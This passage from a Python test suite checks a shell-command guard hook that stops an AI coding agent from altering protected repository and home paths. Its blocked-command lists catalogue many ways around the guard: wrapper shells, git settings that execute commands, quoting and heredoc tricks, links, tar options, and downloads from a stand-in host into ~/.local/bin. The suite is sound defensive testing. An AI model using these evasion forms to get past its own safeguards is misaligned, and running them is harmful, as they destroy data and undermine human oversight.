            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
            self.assertIn(f"[{rid}]", r.stderr, cmd)
        for cmd in ("find . ! -name x -print", "echo }", "[ ! -d build ] && mkdir build", "test ! -f x || rm x",
                    "if ! make check; then echo no; fi", "{ echo a; echo b; } > /tmp/out"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")

    def test_negated_find_message_says_why(self):
        r = self.bash("find . -not -path './.git/*' -name '*.orig' -delete")
        self.assertEqual(r.returncode, 2)
        self.assertIn("negated", r.stderr)


class Round3(ProtectedTree):
    """0005 review round 3: two regressions against main, then the remaining classes."""
    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None

    def blocked(self, cmds):
        for cmd in cmds:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")

    def allowed(self, cmds):
        for cmd in cmds:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")

    def test_ln_destination_is_still_a_write(self):            # CRITICAL regression: blocked on main
        self.blocked(["ln -sf /tmp/evil .github/workflows/aiops-gates.yml", "ln -sf /tmp/x .aiops/config/allowed-commands",
                      "ln -sf /tmp/x .claude/settings.json", "ln -sfn /tmp/x .git/hooks/pre-commit"])

    def test_escaped_find_syntax(self):
        self.blocked([r"find .aiops \( -type f \) -delete", r"find .github \( -type f \) -delete",
                      r"find . \( -name .aiops \) -exec rm -rf {} +", r"find .github -name x -exec rm {} \; -o -exec rm {} \;"])
        self.allowed([r"find . \( -name '*.pyc' -o -name '*.pyo' \) -delete", r"find . -name '*.py' -exec grep x {} \;"])

    def test_directory_names_with_recursive_exec(self):
        self.blocked(["find . -name .github -exec rm -rf {} +", "find . -path ./.github -exec rm -rf {} +",
                      "find . -maxdepth 1 -name '.g*' -exec rm -rf {} +", "find . -name docs -type d -exec rm -rf {} +",
                      "find .github -type d -name workflows -exec rm -rf {} +"])
        self.allowed(["find . -name __pycache__ -type d -exec rm -rf {} +"])

    def test_more_nested_forms(self):
        self.blocked(["sh -c 'rm -rf \"$0\"' docs", "bash -c 'd=$0; rm -rf $d' docs", "trap -- 'rm -rf docs' EXIT",
                      "flock /tmp/l --command='rm -rf docs'", "coproc X { rm -rf docs; }", "parallel -j2 rm -rf ::: docs",
                      "script -qc 'rm -rf docs' /dev/null", "su -c 'rm -rf docs' me", r"git rebase -xrm\ -rf\ docs main",
                      "git -c core.editor='rm -rf docs' commit", "git -c sequence.editor='rm -rf docs' rebase -i main",
                      "git -c core.pager='rm -rf docs' log", "GIT_EDITOR='rm -rf docs' git commit",
                      "GIT_SEQUENCE_EDITOR='rm -rf docs' git rebase -i main", "git bisect run rm -rf docs",
                      "git submodule foreach 'rm -rf ../docs'"])
        self.allowed(["git -c core.editor=vim commit -m x", "git bisect run make test", "script -qc 'make test' /dev/null"])

    def test_more_link_forms(self):
        (self.root / "t").mkdir()
        self.blocked(["ln -s .github q2 && ln -s q2 q3 && rm -rf q3/workflows",
                      "ln -s ../.github t/q && rm -rf t/q/workflows", "ln -t /tmp -s $PWD/.github && rm -rf /tmp/.github/workflows"])

    def test_hard_links_reach_protected_files(self):
        self.blocked(["ln .aiops/config/protected-paths hl2", "ln .github/workflows/aiops-gates.yml hl",
                      "cp -l .claude/settings.json s2", "cp --link .github/workflows/aiops-gates.yml w2"])
        self.allowed(["ln -s README.md readme-link", "cp README.md r2"])

    def test_tar_abbreviations_and_time_of_check(self):
        Incoming.archive(self, "good.tgz", ["src/a.py"])
        Incoming.archive(self, "strip.tgz", ["pkg/.aiops/config/allowed-commands"])
        git(self.root, "branch", "benign")
        self.allowed(["tar -xzf good.tgz --strip-comp=1"])                  # read correctly: nothing guarded
        self.blocked(["tar -xzf strip.tgz --strip-comp=1", "tar -xzf strip.tgz --strip-c 1", "tar -xzf good.tgz --tran s/a/b/", "tar -xzf good.tgz --xfor s/a/b/",
                      "tar -xzf good.tgz --one-top=.aiops/config", "ln -sf /tmp/evil.tgz good.tgz && tar -xzf good.tgz",
                      "cp /tmp/x/good.tgz . && tar -xzf good.tgz", "bash -c 'cp /tmp/e.tgz good.tgz' && tar -xzf good.tgz",
                      "git checkout -B benign HEAD~1 && git merge benign", "git switch -C benign HEAD~1 && git merge benign",
                      "git push . HEAD:benign && git merge benign", "git symbolic-ref refs/heads/benign refs/heads/main && git merge benign",
                      "git tag -f benign HEAD~1 && git merge benign", "git worktree add -B benign /tmp/w && git merge benign",
                      "git cherry-pick -nm2 nosuch"])
        self.allowed(["git status && git merge benign", "git fetch origin && git log -1"])

    def test_writes_into_home_more(self):
        self.blocked(["git clone --depth 1 /tmp/evil ~/.config/git", "git clone -b main /tmp/evil ~/.config/git",
                      "GIT_WORK_TREE=$HOME git checkout HEAD -- .bashrc", "cd ~/.config/git && wget https://e.x/config",
                      "cd ~/.local/bin && curl -O https://e.x/ssh-keygen", "rsync --remove-sent-files .github/workflows/ /tmp/x"])
        import tempfile
        with tempfile.TemporaryDirectory() as plain:              # not an ancestor of the plugin or of home
            self.allowed([f"cd {plain} && wget https://e.x/f", f"git clone --depth 1 https://x/y {plain}/y"])


class Round4(ProtectedTree):
    """0005 review round 4: regressions against main first (escaped backslash, `function f {`), then the classes."""
    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None

    def blocked(self, cmds, rid=None):
        for cmd in cmds:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
            if rid:
                self.assertIn(f"[{rid}]", r.stderr, cmd)

    def allowed(self, cmds):
        for cmd in cmds:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")

    def test_escaped_backslash_is_a_backslash(self):        # CRITICAL regression: blocked on main
        self.blocked(["true \\\; rm -rf .aiops", "echo a\\\;rm -rf .aiops", "true \\\\\\\; rm -rf .aiops"], "G-ART-05")
        self.blocked(["printf %s \\\; rm -rf .github"], "G-FILE-05")
        self.blocked(["find .aiops \\\\\\( -type f \\\\\\) -delete"])          # \\\( : a backslash, then an escaped (
        self.allowed(["echo \; ls", "echo 'a\;b'"])

    def test_function_keyword_body(self):                   # HIGH regression: blocked on main
        self.blocked(["function f { rm -rf .aiops; }; f"], "G-ART-05")

    def test_git_keys_and_variables_that_run_commands(self):
        self.blocked(["git -c diff.external='rm -rf docs' diff", "git -c core.fsmonitor='rm -rf docs' status",
                      "git -c credential.helper='!rm -rf docs' fetch", "git -c mergetool.x.cmd='rm -rf docs' mergetool",
                      "git -c gpg.program='rm -rf docs' commit -S", "git -c filter.x.clean='rm -rf docs' add .",
                      "git -c uploadpack.packObjectsHook='rm -rf docs' fetch", "git -c core.askPass='rm -rf docs' fetch",
                      "GIT_EXTERNAL_DIFF='rm -rf docs' git diff", "GIT_ASKPASS='rm -rf docs' git fetch"])
        self.allowed(["git -c core.editor=vim commit -m x", "git -c credential.helper=store fetch"])

    def test_remote_name_downloads(self):
        self.blocked(["cd .github/workflows && curl -O https://e.x/aiops-gates.yml",
                      "cd .github/workflows && wget https://e.x/aiops-gates.yml",
                      "cd .github/workflows && curl -sSLO https://e.x/aiops-gates.yml"])
        self.allowed(["cd build && curl -O https://e.x/out.o", "wget https://e.x/readme.txt"])

    def test_hard_link_dirs_and_link(self):
        self.blocked(["cp -al .github /tmp/gh", "cp -rl .github /tmp/gh", "cp -la .github /tmp/gh",
                      "link .github/workflows/aiops-gates.yml hl", "rsync -a --link-dest=$PWD/.github src/ /tmp/b"])
        self.allowed(["cp -al build /tmp/b2"])

    def test_find_exec_writers(self):
        self.blocked(["find .github -name '*.yml' -exec cp /dev/null {} \;", "find .github -name '*.yml' -exec sed -i d {} +",
                      "find .github -name '*.yml' -exec tee {} \;"])
        self.allowed(["find . -name '*.py' -exec sed -i s/a/b/ {} +"])

    def test_positional_forms(self):
        self.blocked(["bash -c 'rm -rf \"${@}\"' _ docs", "bash -c 'for d; do rm -rf \"$d\"; done' _ docs",
                      "bash -c 'shift; rm -rf \"$1\"' _ x docs"])
        self.allowed(["bash -c 'echo \"$@\"' _ build"])

    def test_more_wrappers(self):
        self.blocked(["runuser -u me -- rm -rf docs", "watch -n1 -- bash -c 'rm -rf docs'",
                      "parallel -j 2 --halt now,fail=1 rm -rf ::: docs", "git submodule foreach --recursive 'rm -rf ../docs'",
                      "git submodule --quiet foreach 'rm -rf ../docs'"])

    def test_tar_options_and_tilde_links(self):
        Incoming.archive(self, "strip.tgz", ["pkg/.aiops/config/allowed-commands"])
        self.blocked(["TAR_OPTIONS=--strip-components=1 tar -xzf strip.tgz", "TAR_OPTIONS='--transform=s/a/b/' tar -xzf strip.tgz",
                      "export TAR_OPTIONS=--strip-components=1; tar -xzf strip.tgz"])

    def test_time_of_check_after_arbitrary_commands(self):
        Incoming.archive(self, "good.tgz", ["src/a.py"])
        git(self.root, "branch", "benign")
        self.blocked(["make fetch && tar -xzf good.tgz", "./get.sh && tar -xzf good.tgz", "make setup && git merge benign",
                      "git -c remote.origin.fetch=+refs/heads/x:refs/remotes/origin/main fetch && git merge origin/main"])
        self.allowed(["ls && tar -xzf good.tgz", "echo go && git merge benign", "tar -xzf good.tgz -C build"])

    def test_untracked_nested_protected_files(self):
        (self.root / ".aiops" / "config" / "protected-paths").write_text("docs/CODEOWNERS x\n.github/* ci\n")
        self.blocked(["find . \\( -name '*.yml' \\) -delete"])


class Round4Uninitialized(Uninitialized):
    test_safety_pass_blocks = test_gates_stay_dormant = None

    def test_safety_pass_round4(self):
        for cmd in ("function f { cp /tmp/b ~/.bashrc; }; f", "true \\\; cp /tmp/b ~/.bashrc", "ln -s ~ h && tar -xzf h.tgz -C h",
                    "TAR_OPTIONS=-C$HOME tar -xzf h.tgz", "link ~/.gitconfig /tmp/g"):
            r = self.engine(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")


class TokenizerRound5(ProtectedTree):
    """Promoted from review round 5 (zoujagger): three tokenizer holes already on main that hid a whole command."""
    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None

    def test_merged_punctuation(self):
        for cmd, rid in [("echo $(date); rm -rf .github", "G-FILE-05"), ("(cd src); rm -rf .aiops", "G-ART-05"),
                         ("(echo a);rm -rf .aiops", "G-ART-05"), ("echo $(echo a); rm -rf .aiops", "G-ART-05"),
                         ("(ls)&&rm -rf .aiops", "G-ART-05"), ("(ls)|rm -rf .aiops", "G-ART-05")]:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
            self.assertIn(f"[{rid}]", r.stderr, cmd)

    def test_line_continuation(self):
        for cmd, rid in [("rm -rf \\\n.aiops", "G-ART-05"), ("echo x > \\\n.aiops/config/allowed-commands", "G-ART-05"),
                         ("rm -rf \\\n.github", "G-FILE-05"), ('echo "a" && rm \\\n-rf .aiops', "G-ART-05")]:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd!r}: {r.stderr}")
            self.assertIn(f"[{rid}]", r.stderr, cmd)

    def test_ansi_c_quotes(self):
        for cmd in ("echo $'\\'' ; rm -rf .aiops ; echo $'\\'' #'", "echo $'a\\'b' ; rm -rf .aiops"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
            self.assertIn("[G-ART-05]", r.stderr, cmd)

    def test_ordinary_syntax_still_allowed(self):
        for cmd in ("case x in a) echo a;; b) echo b;; esac", "echo $(date)", "echo 'a\\\nb'", "printf $'a\\tb\\n'",
                    "if true; then (cd src && ls); fi", "ls \\\n  -la", "x=$(ls); echo $x", "echo $'it\\'s'"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd!r}: {r.stderr}")


class TokenizerRecheck(ProtectedTree):
    """Targeted re-check of b698d39: the pre-tokenizer must know comments and heredoc bodies (two regressions
    against main, R1 and R2), split `)` off a redirection, and scope a subshell's cd exactly."""
    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None

    def test_regressions_against_main(self):
        for cmd in ("cat <<'EOF'\nx \\\nEOF\nrm -rf .aiops",          # R1: a quoted heredoc body isn't joined
                    "echo hi # $'\\'\nrm -rf .aiops"):                 # R2: $' in a comment isn't a quote
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd!r}: {r.stderr}")
            self.assertIn("[G-ART-05]", r.stderr, cmd)

    def test_continuation_after_heredoc_and_comment_apostrophes(self):
        for cmd in ("cat <<EOF\nit's\nEOF\nrm -rf \\\n.aiops", "echo hi # it's\nrm -rf \\\n.aiops",
                    "echo hi # it's\nrm -rf .aiops\necho '"):          # a quote in a comment pairs with nothing
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd!r}: {r.stderr}")
            self.assertIn("[G-ART-05]", r.stderr, cmd)

    def test_paren_merged_with_redirection(self):
        for cmd in ("(echo x)>.aiops/config/allowed-commands", "(echo x)>>.aiops/config/allowed-commands",
                    "(echo x)&>.aiops/config/allowed-commands"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")

    def test_subshell_cd_is_scoped(self):
        for cmd in ("(cd .github && rm -rf workflows)", "cd .github && (rm -rf workflows)", "(cd src); rm -rf .aiops"):
            self.assertEqual(self.bash(cmd).returncode, 2, cmd)
        for cmd in ("(cd build && rm -rf *)", "(cd /tmp/work && tar -xzf release.tgz)", "(cd /tmp/work && unzip pkg.zip)",
                    "(cd /tmp/clone && rm -rf .git)", "(cd /tmp && rm -rf docs build)", "(cd /tmp/w && rm -rf .aiops)",
                    "(cd /tmp/w && echo x > .aiops/config/x)", "cd $(mktemp -d) && rm -rf .git",
                    "pushd /tmp/w && (rm -rf docs) && popd", "(cd build && make)", "(cd src && rm -rf node_modules)"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")


class ReviewRound6(ProtectedTree):
    """0005 review round 6: three regressions against main in the 4e18711 tokenizer (`#` after `)` read as a comment,
    `time -p` losing command position, a `case` pattern `)` closing the subshell scope) and the heredoc delimiter
    read as `\\w+` (already on main)."""
    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None

    def blocked(self, cmds, rule="G-ART-05"):
        for cmd in cmds:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd!r}: {r.stderr}")
            self.assertIn(f"[{rule}]", r.stderr, cmd)

    def allowed(self, cmds):
        for cmd in cmds:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd!r}: {r.stderr}")

    def test_hash_that_is_not_a_comment(self):
        self.blocked(f"{pre}; rm -rf .aiops" for pre in (
            "echo $(true)#", "echo $((1))#", "cat <(true)#", "x=(a)#", "echo `true #`", 'echo "$(echo " #")"',
            'echo "${x:-" #"}"', "echo $(true)\\\n#"))
        self.allowed(("make check  # run the tests", "echo hi # it's\nls", "(true)# a plain subshell"))
        # defence in depth: once a comment is dropped, the line is also judged with every `#` kept as a word, as main
        # read it: a real separator a misread comment hid shows, and a comment's text stays an argument (round 7)
        self.allowed(("(true)# rm -rf .aiops", "ls src  # touch nothing yet"))

    def test_time_keeps_command_position(self):
        self.blocked(("time -p { rm -rf .aiops; }", "! time -p { rm -rf .aiops; }", "time -- { rm -rf .aiops; }",
                      "time -p ! rm -rf .aiops"))
        self.allowed(("find . ! -name x -print", "time -p make check"))

    def test_case_pattern_paren_is_not_a_scope(self):
        self.blocked((f"cd /tmp; ( cd {self.root}; case a in a) ;; esac; rm -rf .aiops )",
                      f"cd {self.root}/.aiops; ( case x in x) ;; esac; cd /tmp ); rm -rf 0001-csv-export",
                      "case a in (a) ;; esac; rm -rf .aiops"))
        self.blocked(("( cd .github && case a in a) true;; esac && rm -rf workflows )",
                      "cd .github; ( case x in x) ;; esac; cd /tmp ); rm -rf workflows"), rule="G-FILE-05")
        self.allowed(("(cd build && case a in a) true;; esac && rm -rf *)", "(cd /tmp/w); case a in a) ;; esac; ls"))

    def test_only_the_case_keyword_starts_a_case(self):
        """Review round 7 (CRITICAL, regression against main): a quoted, escaped or redirected `case` is an ordinary
        command in bash, and words are never dropped: a `$(…)` in a case pattern runs."""
        self.blocked(("\\case x in ; ( rm -rf .aiops )", '"case" x in ; ( rm -rf .aiops )',
                      "'case' x in\n( rm -rf .aiops )", ">/dev/null case x in ; ( rm -rf .aiops )",
                      "\\case x in ; (cd /tmp); rm -rf .aiops", "case x in $(rm -rf .aiops)) true;; esac",
                      "case x in x) true;; $(rm -rf .aiops)) true;; esac", "case x in (y|$(rm -rf .aiops)) ;; esac"))
        self.blocked(("\\case x in ; ( rm -rf .github )", "ca''se x in ; ( rm -rf .github )",
                      "( cd .github && case a\nin a) true;; esac && rm -rf workflows )",
                      "( cd .github && case $(echo a) in a) true;; esac && rm -rf workflows )",
                      "( cd .github && case `echo a` in a) true;; esac && rm -rf workflows )",
                      "( cd .github && if :; then case a in a) :;; esac; fi && rm -rf workflows )"), rule="G-FILE-05")
        self.allowed(("case $1 in -h|--help) echo usage;; *) make check;; esac", "echo case in point",
                      "case x in (a) ls;; esac"))

    def test_heredoc_delimiters_as_bash_words(self):
        self.blocked(("cat <<E-O\nx\nE-O\nrm -rf .aiops", "cat <<'E'OF\nx\nEOF\nrm -rf .aiops",
                      'cat <<EOF"x"\nx\nEOFx\nrm -rf .aiops', "cat <<EOF.x\nx\nEOF.x\nrm -rf .aiops",
                      'echo "$(echo "<<EOF")"\nrm -rf .aiops', "echo $[1<<EOF]\nrm -rf .aiops",
                      "cat <<NEVER\nx\nrm -rf .aiops"))                 # no delimiter line: the rest is still read
        self.allowed(("cat <<'EOF' > notes.md\nrm -rf .aiops\nEOF", "cat <<-E-O\n\trm -rf .aiops\n\tE-O"))


class CommentsWhenLocked(RepoCase):
    """Review round 7 (MAJOR): in the locked states main allows a comment that names a write; the second reading
    (comments kept) must not turn the comment's text into a command."""
    def test_comment_text_is_no_command(self):
        for cmd in ("ls src  # touch nothing yet", "git log --oneline -5 # mv these into the changelog later",
                    "make check  # install deps first if this fails"):
            r = self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
        r = self.hook("pre-bash", self.hook_input("Bash", command="ls # x\ntouch src/app.py"),
                      env={"CLAUDE_PROJECT_DIR": str(self.root)})
        self.assertEqual(r.returncode, 2, r.stderr)                    # the lock itself still holds
        self.assertIn("[G-LOCK-02]", r.stderr)

class IncomingRound6(Incoming):
    """0005 review round 6 (MINOR): a commit already on main is trusted like main itself, so `git cherry-pick main~1`
    isn't refused for the config it carries; a commit only on another branch still is."""
    test_archives = test_stash = test_merge_rebase_cherry_pick = test_pull = None

    def test_cherry_pick_of_a_main_commit(self):
        bad = self.commit_on("x", ".aiops/config.json", '{"approval_key_policy": "any"}\n')
        main_change = self.commit_on("tmp-main", ".aiops/config.json", "{}\n", base="main")
        git(self.root, "branch", "-qf", "main", main_change)
        for cmd in (f"git cherry-pick {main_change}", "git cherry-pick main", f"git cherry-pick {main_change}^..main"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
        for cmd in (f"git cherry-pick {bad}", f"git cherry-pick {main_change} {bad}", "git cherry-pick main..x"):
            self.assertBlocked(cmd)


if __name__ == "__main__":
    unittest.main()
